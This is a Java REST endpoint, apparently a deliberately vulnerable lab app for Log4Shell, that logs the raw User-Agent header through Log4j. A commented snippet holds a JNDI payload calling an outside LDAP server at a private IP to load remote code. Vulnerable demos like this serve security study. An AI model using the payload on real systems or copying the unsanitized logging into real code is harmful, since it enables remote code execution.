package com.vlfj.restapi;

import java.util.Properties;
import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.HeaderParam;
//import javax.ws.rs.PathParam;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

// Set the context path to whatever you want. here it's just api
@Path("/api")
public class VulnApp {
    private static final Logger logger = LogManager.getLogger(VulnApp.class);

    @GET
    // Get the User-Agent header from the request and log it. Here we can pass the jndi:ldap string
    // since it does not get sanitized or checked. 
    public String greetings(@HeaderParam("User-Agent") String userAgent) {
        // Log that User-Agent
        logger.error("User Agent is: " + userAgent);
        return   "Hi, this is a Vulnerable App!! \n\n";

    }
}

/* This is a snippet of vulnerable code to log4shell
public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String userInput = "${jndi:ldap://172.16.68.187:1389/a}";

        logger.error("Log this thing {}", userInput);
    }
}
*/
